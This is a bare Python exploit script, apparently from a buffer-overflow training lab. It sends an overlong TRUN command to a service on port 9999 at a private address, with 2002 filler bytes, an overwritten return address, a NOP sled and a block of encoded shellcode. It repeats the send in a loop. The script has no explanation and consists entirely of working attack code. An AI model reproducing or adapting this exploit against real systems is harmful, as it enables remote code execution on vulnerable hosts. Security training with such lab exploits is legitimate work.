import sys,socket
host = "192.168.1.102"
port = 9999
buf = "\x41" * 2002
eip = "\xaf\x11\x50\x62"
nop = "\x90" * 16
shellcode = ( "\xbf\x64\xf4\x1b\xe2\xda\xd2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x52\x83\xc2\x04\x31\x7a\x0e\x03\x1e\xfa\xf9\x17\x22\xea\x7c"
"\xd7\xda\xeb\xe0\x51\x3f\xda\x20\x05\x34\x4d\x91\x4d\x18\x62"
"\x5a\x03\x88\xf1\x2e\x8c\xbf\xb2\x85\xea\x8e\x43\xb5\xcf\x91"
"\xc7\xc4\x03\x71\xf9\x06\x56\x70\x3e\x7a\x9b\x20\x97\xf0\x0e"
"\xd4\x9c\x4d\x93\x5f\xee\x40\x93\xbc\xa7\x63\xb2\x13\xb3\x3d"
"\x14\x92\x10\x36\x1d\x8c\x75\x73\xd7\x27\x4d\x0f\xe6\xe1\x9f"
"\xf0\x45\xcc\x2f\x03\x97\x09\x97\xfc\xe2\x63\xeb\x81\xf4\xb0"
"\x91\x5d\x70\x22\x31\x15\x22\x8e\xc3\xfa\xb5\x45\xcf\xb7\xb2"
"\x01\xcc\x46\x16\x3a\xe8\xc3\x99\xec\x78\x97\xbd\x28\x20\x43"
"\xdf\x69\x8c\x22\xe0\x69\x6f\x9a\x44\xe2\x82\xcf\xf4\xa9\xca"
"\x3c\x35\x51\x0b\x2b\x4e\x22\x39\xf4\xe4\xac\x71\x7d\x23\x2b"
"\x75\x54\x93\xa3\x88\x57\xe4\xea\x4e\x03\xb4\x84\x67\x2c\x5f"
"\x54\x87\xf9\xf0\x04\x27\x52\xb1\xf4\x87\x02\x59\x1e\x08\x7c"
"\x79\x21\xc2\x15\x10\xd8\x85\xd9\x4d\xe3\x3d\xb2\x8f\xe3\xb8"
"\x7b\x19\x05\xa8\x6b\x4f\x9e\x45\x15\xca\x54\xf7\xda\xc0\x11"
"\x37\x50\xe7\xe6\xf6\x91\x82\xf4\x6f\x52\xd9\xa6\x26\x6d\xf7"
"\xce\xa5\xfc\x9c\x0e\xa3\x1c\x0b\x59\xe4\xd3\x42\x0f\x18\x4d"
"\xfd\x2d\xe1\x0b\xc6\xf5\x3e\xe8\xc9\xf4\xb3\x54\xee\xe6\x0d"
"\x54\xaa\x52\xc2\x03\x64\x0c\xa4\xfd\xc6\xe6\x7e\x51\x81\x6e"
"\x06\x99\x12\xe8\x07\xf4\xe4\x14\xb9\xa1\xb0\x2b\x76\x26\x35"
"\x54\x6a\xd6\xba\x8f\x2e\xe6\xf0\x8d\x07\x6f\x5d\x44\x1a\xf2"
"\x5e\xb3\x59\x0b\xdd\x31\x22\xe8\xfd\x30\x27\xb4\xb9\xa9\x55"
"\xa5\x2f\xcd\xca\xc6\x65" )
buf = buf+eip+nop+shellcode
while True:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	print(s.recv(1024))
	print(str(len(buf))+" byte gonderildi.")
	s.send("TRUN /.:/ " + buf)
	print(s.recv(1024))
	s.close()